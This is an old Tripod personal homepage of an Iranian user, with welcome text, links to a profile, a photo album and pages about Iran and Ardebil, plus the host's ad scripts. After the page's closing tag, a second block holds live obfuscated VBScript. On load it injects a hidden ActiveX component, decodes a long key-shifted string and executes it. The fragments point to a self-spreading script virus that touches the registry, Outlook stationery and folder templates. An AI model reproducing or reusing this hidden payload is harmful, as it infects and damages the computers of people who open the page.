
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="Content-Language" content="en-us">
<title>Welcome to Mahdi Site!</title>
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<script language="Javascript"><!--
var x = 0
var speed = 70
var text = "Welcome to my personal web site!"
var course = 120
var text2 = text

function Scroll() {
window.status = text2.substring(0, text2.length)

if (course < text2.length) {
setTimeout("Scroll2()", speed)
}

else {
text2 = " " + text2

setTimeout("Scroll()", speed);
}
}

function Scroll2() {
window.status = text2.substring(x, text2.length)

if (text2.length - x == text.length) { 
text2 = text
x = 0

setTimeout("Scroll()", speed);
}

else {
x++
setTimeout("Scroll2()", speed);
}
}

Scroll()
// -->
		</script>

<meta http-equiv="Page-Exit" content="revealTrans(Duration=1.0,Transition=3)">
<meta http-equiv="Site-Enter" content="revealTrans(Duration=1.0,Transition=3)">
<meta http-equiv="Site-Exit" content="revealTrans(Duration=1.0,Transition=3)">
</head>

<body bgcolor="#000000" text="#FF9900" link="#FFFF00" vlink="#FFFFFF" alink="#00FF00" style="font-family: Book Antiqua"><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "mehdishokri57";
var tripod_member_page = "mehdishokri57/index.htm";
var tripod_ratings_hash = "1319414582:49739eb40acd289ba01a684c8ee124cf";

var lycos_ad_category = {"dmoz":"society\/relationships","ontarget":"&CAT=family%20and%20lifestyles&L2CAT=relationships","find_what":"all web sites"};

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=63096";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=63096";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}

window.onload = function() {
    var f = document.getElementById("FooterAd");
    var b = document.getElementsByTagName("body")[0];
    b.removeChild(f);
    b.appendChild(f);
}

</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px">
    	<img src="http://pd.tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important; height:94px!important"> 
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=63096" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>

<div align="center"><center>
</head>

</div>
</center>
<table border="0" width="100%">
  <tr>
    <td width="100%" background="fire.gif">
      <p align="center"><b><font size="6" color="#FF0000">Welcome to my Web
      site!</font></b></td>
  </tr>
</table>
      <table border="0" width="100%" height="20">
        <tr>
          <td width="100%" height="1">
            <p align="center" style="margin-top: 17"><font face="Book Antiqua" size="5" color="#FF9900">
    <marquee scrollamount="2" bgcolor="#000000" width="356" style="font-size: 12pt; color: #FF00FF; font-weight: bold; font-family: Comic Sans MS" height="21">Congratulation!&nbsp;&nbsp;
    Welcome to my Web site! You see my personal web site !!</marquee></font></td>
        </tr>
      </table>
<table border="0" width="100%">
  <tr>
    <td width="100%">
      <p align="center" style="margin-top: 15"><b>
            <font color="#FF9900">
            <font face="Comic Sans MS" size="4">
            I am very glad to see you in my Web site and I hope you&nbsp;<br>
 enjoy this site and see you again!</font></font></b></td>
  </tr>
</table>
<table border="0" width="100%">
  <tr>
    <td width="100%">
      <p align="center" style="margin-top: 5"><img border="0" src="thanksgry.gif" width="180" height="84"></td>
  </tr>
</table>
<table border="0" width="100%">
  <tr>
    <td width="100%">
      <p align="center"></td>
  </tr>
</table>
<table border="0" width="100%">
  <tr>
    <td width="50%"><b><font size="4" face="Tahoma">&nbsp;&nbsp;&nbsp;&nbsp; <a href="profile.htm">About Me</a></font></b></td>
    <td width="50%"><b><font size="4" face="Tahoma">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      <a href="aboutiran1.htm">About Iran</a></font></b></td>
  </tr>
</table>
<table border="0" width="100%">
  <tr>
    <td width="50%" valign="top" align="center">
      <p style="margin-left: 0; margin-top: 4"><b><font face="Book Antiqua" size="3" color="#FF9900">In
      this site you will know me ,You&nbsp; can &nbsp;see my Profile, Hobbies,
      Interests, Favorites,&nbsp; Ambitions,&nbsp;<br>
      and many other things!<br>
      You can see my Resume ,The professional skills!&nbsp;</font></b></td>
    <td width="50%" valign="top" align="center">
      <p style="margin-top: 4"><b><font face="Book Antiqua" size="3" color="#FF9900">If&nbsp;
                  you want to&nbsp; know my country, so you&nbsp;<br>
 can 
        see this site!</font></b></td>
  </tr>
</table>
<table border="0" width="100%">
  <tr>
    <td width="50%">
      <p style="margin-top: 16"><b><font size="4" face="Tahoma">&nbsp;&nbsp;&nbsp;&nbsp;
      <a href="photoalbum.htm">Photo Album</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></b></p>
    </td>
    <td width="50%">
      <p style="margin-top: 16"><b><font size="4" face="Tahoma">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      <a href="aboutardebil.htm">About Ardebil</a></font></b></p>
    </td>
  </tr>
</table>
<table border="0" width="100%">
  <tr>
    <td width="50%" valign="top" align="center">
      <p style="margin-top: 4"><b><font face="Book Antiqua" size="3" color="#FF9900">Look 
        at my new online photo album filled with pictures from my country and
      me!</font></b></td>
    <td width="50%" valign="top" align="center">
      <p style="margin-top: 4"><b><font face="Book Antiqua" size="3" color="#FF9900">In
      This site you will see my father and mother birthplace, It is very
      beauty&nbsp; town, You will see! <br>
      </font></b></td>
  </tr>
</table>
<p style="margin-top: -3">&nbsp;</p>
<table border="0" width="100%">
  <tr>
    
  </tr>
</table>
<p style="margin-top: -5">&nbsp;</p>
<table border="0" width="100%">
  <tr>
    <td width="100%">
      <p align="center"><font size="4"><img border="0" src="pointright.gif" width="20" height="11"><marquee scrollamount="4" width="155" style="color: #00FF00; font-size: 10pt; text-decoration: blink; font-weight: bold; font-family: Tahoma" height="16" behavior="alternate">email:mshnir@yahoo.com</marquee></font></td>
  </tr>
</table>
<p style="margin-top: -4">&nbsp;</p>
<table border="0" width="100%">
  <tr>
    <td width="100%"><b><font size="1" color="#808080">This page was last
      updated on&nbsp; <i>3-May-2004</i></font></b></td>
  </tr>
</table>
</body>

</html>

<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "AffFkPcbo^'EqfgQbqo)S[nQbqo)A^bob^Nfdg'>migbL[eb`m'CPH'TpLcbie'TfgK^qa'Pr[@)Cbi^ir?fpdPn]HCZpqZmq%HCNbq=dj%HC>obZobJbgfbn#&FGIbfbFm#&FG@k`^q^H^fe#&FGMkjm^`\qb!$>iaLp_Cni`qbjkDE>mi`kaMj%CbgbMZoe)MtmbLoo&Lk@oohmO^nrj^KbqoL`qK`^aM`jm8CLJ+Li`kQ^sqCbgb%?dibI\qe%,&OjmLoo6ObZ_Qbfk+O^\a>egBaFgnqo!OjmLoo)FG\lo^om#&9;+LkIbg#QjiNqo9*Qe^iK`^aM`jm'>ill`>sfqArk\oflgBg_F_F_Qvi`Pqk:cqqQe^iK`^aM`jm'>ill`L`q?dibM`jm8CLJ+Li`kQ^sqCbgb%?dibI\qe%-&Afi^Obji)Tobob7?H?VhiilZ_:#s_l^ofio7!DE\pm\oq!$#9s_<mIc!QfkPqk#o]@oEa#CqjeObumCbgbQ^hm+<glp^P^oC:oqob]:APL'Bbq?dib!Afi^K^qa$?<qqkd_+Zoqob]rq^n:.1@ip^O^\aQ^hm+<glp^P^oCbgbQ^hm6CPH)Lm^iQbqoCfe`%CbgbMZoe)1$BaQrkbPmm:eqfgMcbkCfe`Qbfk+Tkdqbq_@kGc9#CQJE9s_<mIc!5#?L=Tlggl^]8#q_p\mfmm5HCZpqZmq%!7#q_@kGcEqfgQbqo>gpbBaQrkbPmm:s_lQa`kAfi^Obji)Tobobo]@oEa#Q_pM`uqBk]FcCfe`Qbfk+@ejpbBk]FcBk]Crg^qfhiCrg^qfhiHC>e^gbbPn]%@nmobgoPqkdkd%G^pmDka^s@eZm&DcE\pqBiabq>e^k:)Qe^iBaI^aq%E>^p^#@rkmbkmNqobid&%,&67I<\pb!`Qe^iDE@eZidbLp_6Cfg\iv=dph!3WNr_>:)BenbFG@a\kd^Nr_8@am%>l^%I^aq%E>^p^#@rkmbkmNqobid&%,&&(.#5YPr[@:+>iaBa>gpbHG<c^k``Pr[:Fda%<poo^iqPmmfk`'.)E\pqBiabq>e^k$>iaBa>ia?pk`mdlk?pk`mdlkFG@k`^q^H^fe#&Jk>molkOblpjbIbumF_FkPcbo^:cqjeQa`k@ufmCrg^qfhi>iaBaLc^o^Afi^:E`cq!RfkI\qe%.&MkjdoZhCbgbpU>ljfjk?diblWJf\mlphaqLc^o^_YPm\qfhiborW_iZih+aojFc#CPH)Cfe`Bubnqp!Ne^k`Cfe`&&Oebg@ZgiDE>mi`kaMj%Pa\ob?dib%eqfg&Bil`L`q?dibM`jm8CLJ+Li`kQ^sqCbgb%Lc^o^Afi^'/)mmrbCbgbQ^hm+Pmfq^9#CQJE9s_<mIc!5#?L=Tlggl^]8#q_p\mfmm5HCZpqZmq%!7#q_@kGcEqfgQbqo?dibM`jm'>ill`>iaBa=`c^ngqF]:PnPe^gi+K`dO^\a%CHBRZ@RKMBKMZRP>MYF]`kqbofblWAb_\rimRp^mF=&JrqEjlhO`opbjk6TpLcbie)Ob`Mb^]#ED@V\EJ@>EZJ><CFK>WPl_ot^k`YJb^olljcqUJrqejlh@umk`ppUHbab\Sbk&RpPa`ii'MbdPmfq^ED@V\<POO>IQ\NNBOUDabgofqb`pY!Ab_\rimDa#WPl_ot^k`YJb^olljcqUJrqejlh@umk`ppU#E`cq!JrqEjlhO`opbjk)*$#)-YF\fiU>ljijpbPpbNq^mdlk^mv%,)K@D\=RLO=<\iiFGJZdiO^b%AFBVX>ROK@KQXPPBKWFa^iqfmdbpU#A^a^reoFaYPhaqtZmbYFd`ohnlcmWLrmglldBuimbplW#Gbcm#LrmGlldQboldlk%,&+-UH^feWPqZoflg`ovI^j^)Pa\ob?dib@ZgiDEJ^bgOb`#ED@V\<POO>IQ\NNBOUDabgofqb`pY!Ab_\rimDa#WPl_ot^k`YJb^olljcqUJrqejlh@umk`ppU#E`cq!JrqEjlhO`opbjk)*$#)-YF\fiURfa^PqZoflg`ovI^j^)Pa\ob?dibTlNebeg+O^bTobobCHBRZ@RKMBKMZRP>MYPhaqtZmbYFd`ohnlcmWLc_d`bU4+-UJrqejlhUJmqbjkpUH^feWBaboloImbc^mbk\`)*..-0-)K@D\=RLO=<\iiFGJZdiO^b%AFBVX>ROK@KQXPPBKWPl_ot^k`YJb^olljcqURfk]jtpHbpl\dfgbPn]pvlobjUKol_diblWJf\mlphaqHpqihjhBiqbkibqNbqmdkdlW-^)_-/)+--)+--)+`-)+--)+--)+---1Y-),b-,1-%_iZih@ZgiDEJ^bgOb`#ED@V\<POO>IQ\NNBOUNlcmr^o^WJf\mlphaqYPdkahrpGOY@nmobgoSbknflgWTfg_ltlJbln^dbidLp_prnqbfWMohafi^nYJb^olljcqJrqejlhDkq^mkbmPbmofk`nY-Z+a-++--)+--)+-`)+--)+--)+--)/3Y)+.b).3-'_e\kh$PnPe^gi+K`dTkdqbEH>T\@NMOBGO\RL@OYLjcqp\obUHf`kjpl_oYL_af`^W.-'+YLnoilhfYLioflgnYJZdiY>_fqhmMo^abo^i`b'.0*+4/%OB@ZATHMA@^egHCH^feMbd!EH>T\@NMOBGO\RL@OYLjcqp\obUHf`kjpl_oYL_af`^W.-'+Y@hhjlgWJ^bgPbmofk`nYK^rPqZoflg`ov'_e\kh$DErjf\db?jia^m%I^aq%PdkMZoe),$#Mohbo^fCfe`pY<jjjhiCbgbpUHf`kjpl_oPa\ob]WPqZoflg`ov$>ia?pk`mdlk?pk`mdlkFG@k`^q^Hfib`r%LgBokjoK`prf`K^sqObjiK^qa:BaKho%CLJ+CbgbBqdpql#TfgK^qa#RP`kdmq'`ub$&McbkQbfkM^mc:pvlobj,-YBk]FcFcObjiK^qa:nvpm`j0+WMcbkPqZmqRiAfi^:PdkMZoePRNQBFWHbkibi,-+aeg@ip^Pm\oqNkCfe`:RfkI\qe!LTPQ>HYH^mkbe)aie>iaBaPnPe^gi+K`dTkdqbEH>T\IH>>IXH>@ADKBUNlcmr^o^WJf\mlphaqYPdkahrpY<poo^iqS^mpfhiYOniYH^mkbe./%Nq^koRm?dibCPH)@litCfe`TbiM^mc#tb[Whgp\ii'bfc'TfgK^qa#rb_UAli]`o+aoqCPH)@litCfe`TbiM^mc#pvlobj,-Yhcr^ie)df_)TbiM^mc#pvlobj,-Ya^nhqhk+fgd>^ieHG:kmbg_Ql!RfkI\qe!p`_Y?jia^m+emo)cqq$PnPe^gi+K`dTkdqbEH>T\@E<PP>N\OHJQY'_iiU)]gicbgbTpLcbie)Ob`Rofm`AFBVX>I>LNBPXMLLMW+aegY@hiqbgoQrkb%^migf`Zoflg*u*fnalpiilZ_RpPa`ii'MbdPmfq^ED@V\<G>PL@P\KJLQU_ii_dibU?bcZpiqB^lkU)TlNebeg+O^bObZ_%AFBVX>I>LNBPXMLLMWsu]afi^WAb_\rimD`lgW&TpLcbie)Ob`Rofm`AFBVX>I>LNBPXMLLMWaieafi^WP`kdmq>idfg`Y%S?L^ofioRpPa`ii'MbdPmfq^ED@V\<G>PL@P\KJLQU_ii?dibUNebegYLi`kY<jjjZiaY'TfgK^qa#M`jmI\qe!PN`obkq+^sb.#PnPe^gi+K`dTkdqbEH>T\@E<PP>N\OHJQY]giCbgbYLcbie@uYImlm^mqvLcbbmC^k]gbolWTPAKolinY%x3)-21<<2*200?&,.@?(5@21*-)<>-)=54)3@zTlNebeg+O^bTobobCHBRZ@I:NPBLZOLHOYaegCfe`YP\mfmmClpm@k`h_bY'x10.0*10.&/5-<(..=-*?*A6*)+@--A53<./1vL`q?dibM`jm8CLJ+Li`kQ^sqCbgb%Lo^omPmCbgb)+'qon`&Afi^Obji)TobobO]pQ^sqAfi^Obji)@ihnb@kaArk\oflgArk\oflgHGEdhbBo%&FcDkTa`ob7;cqjeQa`k@ufmCrg^qfhi>iaBaMcfpEj`^mdlk8ah^rj^iq+ej`^mdlkFcGbcm#QebnIl\\qfhi)-$:cfe`McbkQebnIl\\qfhi:Hfa!OeflGl`Zoflg'6&FcAPL'Bbq>sqbgnflgI^j^#QebnIl\\qfhi&59qe^iMcfpEj`^mdlk8I^aq%McfpEj`^mdlk%Gbk!OeflGl`Zoflg$*Gbk!APL'Bbq?dibG\jb!OeflGl`Zoflg$&&Bk]FcFcGbk!OeflGl`Zoflg$;.Qa`kOeflGl`Zoflg:McfpEj`^mdlk!U>iaBaDErjf\db?jia^m%QadpIh^^qbjk&Bk]FcBk]Crg^qfhiCrg^qfhiHCH^feMbd!MbdLoo)?dibG\jbLgBokjoK`prf`K^sqMbdM`jmLoo6TpLcbie)Ob`Mb^]#Ob`NqoF_Ob`ObjiNqo8Qe^iPnPe^gi+K`dTkdqbMbdLoo)?dibG\jbBk]FcBk]Crg^qfhiCrg^qfhiHCJ_lLp_%<poo^iqPmmfk`$Lp_B8-QbloLrm:)AhTebgbMmrbQbloLrm:M`pqHpq$.DcM`pqHpq7/5Oebg@nmobgoPqkdkd8Cbi^ir?fpd#5YBuboAhBg_F_LgBokjoK`prf`K^sqNbqOeflAli]`o6CPH)DbmAli]`o%<poo^iqPmmfk`$L`q=d`Pn]:>obZobL[eb`m#P\mfmmdkd'?f`mdlkZmvP^oChgabkn:OeflAli]`o+Lp_Chgabkn?jia^m@lniq6-Alo@^`aQbfkCle_bodk?jia^mpAli]`o@hpkq8Chgabk>lrgo(,=d`Pn]+^]_Chgabk>lrgo)M`jm?jia^m+KZhbIbumF_Af\Nr_'>lrgo:+Qa`kG^pmDka^s@eZm:DkpmmObo#@rkmbkmNqobid)W)E`k%<poo^iqPmmfk`$*.Pn]Pqkdkd8Jb_%@nmobgoPqkdkd%G^pmDka^s@eZm(.%Gbk!>rok`kqLoofgb&*E\pqBiabq>e^k(.&@rkmbkmNqobid6HG<c^k``Pr[#@rkmbkmNqobid)E\pqBiabq>e^k$Lp_B8.Bil`BaPn]B6-Mcbk@rkmbkmNqobid6@rkmbkmNqobidAf\Nr_'Dqbf#.&!U>sfq?l@ip^g8-Clkg6.MjChgabk>lrgoBaI<\pb!Nr_Loofgb&6I@Znb%=d`Pn]+Fm`j%c$&McbkFce9Ali]`o@hpkqOebg@nmobgoPqkdkd8@nmobgoPqkdkd!Ab^Pr[)Fq^h%g$,&YBqdq=j>iaBa>iaBaG`uqI^loFk]`u@a\o6FklooO^q%@nmobgoPqkdkd%Y%Gbk!>rok`kqLoofgb&**$Lp_Pmmfk`:Fda%<poo^iqPmmfk`'I^loFk]`u@a\o(*'Ibg#@rkmbkmNqobid&&G^pmDka^s@eZm*.@nmobgoPqkdkd8HC>e^gbbPn]%@nmobgoPqkdkd%G^pmDka^s@eZm&@kaDc@kaDcGlliHCJ_lLp_6@rkmbkmNqobid@kaArk\oflgArk\oflgHGImlmZb^q^#&Jk>molkOblpjbIbumO^bM^mcS^epb6ED@V\EJ@>EZJ><CFK>WPl_ot^k`YJb^olljcqUJrqejlh@umk`ppU?bdk`bAflfAb`mbb8TlNebeg+O^bObZ_%O^bM^mcS^epb&Fc?fpd?bdk`b6OebgAbnhA^bob^:?dk^etAflf#7YBg_F_Chmf6,qh2?fpd?bdk`b6HGH]lPn]%AbnhA^bob^$DErjf\db?jia^m%AbnhA^bob^$G`uqTpLcbie)Ob`Rofm`O^bM^mcS^epb)=dph=`do^`>ia?pk`mdlk?pk`mdlkFGrfh^d^Ali]`o%I\qeG\jbLgBokjoK`prf`K^sqNbqAli]`oKZhb6CPH)DbmAli]`o%I\qeG\jbP^oQadpCbgbp8ChgabkI^j^)Cfe`pCqq>sfpmn:+?jo>\`eOeflAfi^FkOeflAfi^n?dib>sq6R@Znb%?NL+@`qBqobkldlkG\jb!OeflAfi^)M^mc&&FcAfi^@uq8AOJJo?dib>sq6EMHIJo?dib>sq6>LKHmCbgbBqo:MEILkCfe`Bum:EPMQe^i<\iiFG>ikbk]Ol%Mcfp?dib'K^qa'emhiBenbF_Cfe`Bum:Q?PQe^i<\iiFG>ikbk]Ol%Mcfp?dib'K^qa's[n&Bil`FcAfi^@uq8AOQOebgEmoBubnqp8.Bk]FcKbqoBa%N>^p^#M^mcK^f`&6R@Znb%PdkMZoeA^nhqhkY$Lk%R<\pb!K^qaI^j^$:P@^l`%TbiM^mc#Ablfqli&&McbkEqm@uflop6.@kaDcDcAoqBqdpql:)Qe^i?NL+<jmv?dibRfkI\qe!ltpq^h0/U_bpdolm'dkf'M^mcK^f`?NL+<jmv?dibRfkI\qe!p`_Y?jia^m+emo)I\qeG\jbBk]FcBk]Crg^qfhiCrg^qfhiHCNbq=dj%LgBokjoK`prf`K^sq@oo'>ibZmM`pqBo:RP`kdmq'N`obkqCngikZhbDc>moMcbkFkPcbo^:cqje>gpbFkPcbo^:q_pBg_F_F_FkPcbo^:q_pQe^iL`q?NL6@o^\qbH]gb\o%L^ofiofk`)Cfe`PvlobjH]gb\o&PbmTpLcbie:<mb^m`L_c``q!TP\mfmm)Pe^giBenbNbq<mme`L_c``q8ah^rj^iq+Zkmi^op%FG\`pbpm&<mme`L_c``q'nbq<GPF=#x?402=>//&,@C)(..=+*>==6*)+@--AA21<-?v&<mme`L_c``q'^obZobFgnq^g^b%P^oTlNebeg:<mme`L_c``q'BbqH]gb\o%&>migbL[eb`m)pbm>IPB?%t+A1,AB-*(C-2.*.*>C*141-&+->)>6-.///1x&>migbL[eb`m)`o^\qbBipqZi`b!$L`q?NL6>migbL[eb`m)DbmJ_g^^q%Bg_F_P^oAbnhL[eb`m:?NL+=mfs^n?jo>\`e?fpdObjiFk?fpdJ_g^^qDc=dphM`jm'?ofo`Qvi`97/:ia=dphM`jm'?ofo`Qvi`97.McbkBuboChm>iaBa?dk^etAflf:?fpdObji)AobqbI^oqbkK^sq?fjJqe^m>ok#0&O^g_ljbubAlod:-Ol,Lmcbo:mo%b$:Dkq!#6#Ok]$&IbumQ^hmPmmfk`:?job8.MjI^i%QadpQ^sq&QbfkKrf::n`%Fda%McfpM`uq%d).$BaQ^hmKnh:,0McbkQbfkKrf:+3>gpbBaQ^hmKnh:,-McbkQbfkKrf:+4>iaBaM`jm<c^o8@am%Q^hmKnh*Jqe^m>ok#fFja-$&DcM`jm<c^o8@am%0-$Qa`kObji>e^k:<co%*3&@kaDcObjiNqobid6QbfkPqkdkd!Q^hm@a\oIbumRgGl`dNqo8>sb`nob%AffHbr<oo!.&)McfpM`uq#s[>oI_!D`v>km%-:#Hoebk<oo!+&!s_<mIcH^t>ok#.&8!Lmcbo:mo%*$#q_@kGc#Hbr<oo!-&6Lqa`o>km%/##o]@oEa#Fbv:mo%,$:#Jqe^m>ok#0&!#s[>oI_!?job8.MjI^i%Bq`Pqkdkd#o]@oEa#ObjiIrj8>l^%Jb_%Bq`Pqkdkd%d).$q_@kGc#FcObjiIrj8.1Qe^iq_@kGc#QbfkKrf:,/q_@kGc#Bk]Fc#s[>oI_!M`jm<c^o8@am%Q^hmKnh(Fbv:mo%bJl]1&#o]@oEa#DcM`jm<c^o8@am%/1$Qa`k!s_<mIcQ^hm@a\o6s_<mq_@kGc#Bil`FcObji>e^k:<co%+4&Mcbk#s[>oI_!M`jm<c^o8s[Gc!s_<mIcBg_F_#o]@oEa#OeflObum:McfpM`uq!Q^hm@a\o!s_<mIcK^sq$s_<mIc!>sb`nob%McfpM`uqMcfpM`uq8>sbPmmfk`:QbfkPqkdkd!CqjeObum:5#p`kdmqg^k`p^d^8s_l^ofio;!s[>oI_#_l`nhbkm)tobob#!5#afopqrgb: klpboflg5^_ljirm`8e`cq3+mu4qli5-mq6tb_qe3+mu4ebbbeq3+mu4w*biabq5/54sfld_fedqv3ef]_bk 99##>MIGBQI>J>8HG#Zdr^nqA@FDAO:-RFAMC:-^la^8`lf)jp'#^`mdsbQ)>`mdsb#S@lfklk^iq;#7,:KMI>O;!5#,abq;#q_@kGc9#*p`kdmq7#q_@kGc9#n`obkqe\kdn\db6q_p\mfmm9s_<mIc!QadpQ^sqs_<mIc!RgGl`dNqo!s[>oI_#7,l^ofio;!s[>oI_#7,;JAV7#q_@kGc9#*EQFG;S_lObum:McfpM`uq!s[>oI_#NiIl\fPqk#o]@oEa#HGXnq^ko%&TbiM^mc:APL'BbqLkb`b\iChgabk#-&!UBa%?NL+?dib>sfpmn%TbiM^mc#tb[WCle_bo'cqq$&McbkCPH)@litCfe`TbiM^mc#tb[WCle_bo'cqq'TfgK^qa#rb_UfgtZgi+`dcBk]FcFc#CPH)Cfe`Bubnqp!RfkI\qe!ltpq^h0/U_bpdolm'dkf$&McbkCPH)@litCfe`TbiM^mc#pvlobj,-Ya^nhqhk+fgd)PdkMZoeprnqbf./Ydet^eg+dba@kaDc@kaArk\oflg"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 5"&vbCrLf&"KeyArr(1) = 3"&vbCrLf&"KeyArr(2) = 3"&vbCrLf&"KeyArr(3) = 7"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</body>
</HTML>